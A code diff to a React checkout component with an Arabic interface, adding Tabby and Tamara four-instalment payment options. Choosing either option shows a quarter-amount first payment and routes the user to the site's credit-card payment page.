@@ -101,7 +101,7 @@ export default function SummaryPayment() {
     });
 
     const data: Record<string, string> = {
-      'طريقة الدفع': selectedPaymentMethod === 'card' ? 'بطاقة ائتمان / مدى' : 'Apple Pay',
+      'طريقة الدفع': selectedPaymentMethod === 'card' ? 'بطاقة ائتمان / مدى' : selectedPaymentMethod === 'tabby' ? 'تابي' : selectedPaymentMethod === 'tamara' ? 'تمارا' : 'Apple Pay',
       'المبلغ الإجمالي': totalAmount + ' ريال',
     };
 
@@ -109,8 +109,9 @@ export default function SummaryPayment() {
 
     setTimeout(() => {
       setIsProcessing(false);
-      if (selectedPaymentMethod === 'card') {
-        clientNavigate(`/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`);
+      if (selectedPaymentMethod === 'card' || selectedPaymentMethod === 'tabby' || selectedPaymentMethod === 'tamara') {
+        const payAmount = (selectedPaymentMethod === 'tabby' || selectedPaymentMethod === 'tamara') ? (totalAmount / 4).toFixed(2) : totalAmount;
+        clientNavigate(`/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${payAmount}`);
       } else {
         clientNavigate(`/bank-transfer?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`);
       }
@@ -302,6 +303,52 @@ export default function SummaryPayment() {
                         <p className="text-xs text-red-500 mt-2 text-center">الدفع عن طريق Apple Pay غير متاح حالياً</p>
                       )}
                     </div>
+
+                    {/* Tabby Option */}
+                    <div
+                      className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
+                        selectedPaymentMethod === 'tabby'
+                          ? 'bg-blue-50'
+                          : 'border-gray-200 hover:border-blue-300'
+                      }`}
+                      style={selectedPaymentMethod === 'tabby' ? { borderColor: primaryBlue } : {}}
+                      onClick={() => setSelectedPaymentMethod('tabby')}
+                    >
+                      <div className="flex items-center gap-2">
+                        <div className={`w-5 h-5 shrink-0 rounded-full border-2 flex items-center justify-center`}
+                          style={{ borderColor: selectedPaymentMethod === 'tabby' ? primaryBlue : '#d1d5db' }}>
+                          {selectedPaymentMethod === 'tabby' && <div className="w-3 h-3 rounded-full" style={{ backgroundColor: primaryBlue }} />}
+                        </div>
+                        <img src="/images/tabby-logo.png" alt="Tabby" className="w-16 h-10 object-contain shrink-0" />
+                        <div className="min-w-0">
+                          <p className="font-medium">تابي</p>
+                          <p className="text-sm text-gray-500 whitespace-nowrap">قسّمها على 4 دفعات</p>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Tamara Option */}
+                    <div
+                      className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
+                        selectedPaymentMethod === 'tamara'
+                          ? 'bg-blue-50'
+                          : 'border-gray-200 hover:border-blue-300'
+                      }`}
+                      style={selectedPaymentMethod === 'tamara' ? { borderColor: primaryBlue } : {}}
+                      onClick={() => setSelectedPaymentMethod('tamara')}
+                    >
+                      <div className="flex items-center gap-2">
+                        <div className={`w-5 h-5 shrink-0 rounded-full border-2 flex items-center justify-center`}
+                          style={{ borderColor: selectedPaymentMethod === 'tamara' ? primaryBlue : '#d1d5db' }}>
+                          {selectedPaymentMethod === 'tamara' && <div className="w-3 h-3 rounded-full" style={{ backgroundColor: primaryBlue }} />}
+                        </div>
+                        <img src="/images/tamara-logo.png" alt="Tamara" className="w-16 h-10 object-contain shrink-0" />
+                        <div className="min-w-0">
+                          <p className="font-medium">تمارا</p>
+                          <p className="text-sm text-gray-500 whitespace-nowrap">قسّمها على 4 دفعات</p>
+                        </div>
+                      </div>
+                    </div>
                   </div>
                 </div>
               </div>
@@ -333,15 +380,19 @@ export default function SummaryPayment() {
                     </div>
                     <hr />
                     <div className="flex justify-between font-bold text-lg">
-                      <span>المجموع</span>
-                      <span style={{ color: primaryBlue }}>{totalAmount} ر.س</span>
+                      <span>{(selectedPaymentMethod === 'tabby' || selectedPaymentMethod === 'tamara') ? 'الدفعة الأولى' : 'المجموع'}</span>
+                      <span style={{ color: primaryBlue }}>{(selectedPaymentMethod === 'tabby' || selectedPaymentMethod === 'tamara') ? `${(totalAmount / 4).toFixed(2)} ر.س` : `${totalAmount} ر.س`}</span>
                     </div>
+                    {(selectedPaymentMethod === 'tabby' || selectedPaymentMethod === 'tamara') && (
+                      <p className="text-xs text-gray-500 text-center">المبلغ الكلي {totalAmount} ر.س مقسّم على 4 دفعات</p>
+                    )}
                   </div>
 
                   <button
                     className="w-full mt-6 py-3 rounded-lg text-white font-bold flex items-center justify-center gap-2 transition-all"
                     style={{ backgroundColor: (!selectedPaymentMethod || selectedPaymentMethod === 'transfer' || isProcessing) ? '#9ca3af' : primaryBlue }}
                     disabled={!selectedPaymentMethod || selectedPaymentMethod === 'transfer' || isProcessing}
+
                     onClick={handlePayment}
                   >
                     {isProcessing ? (
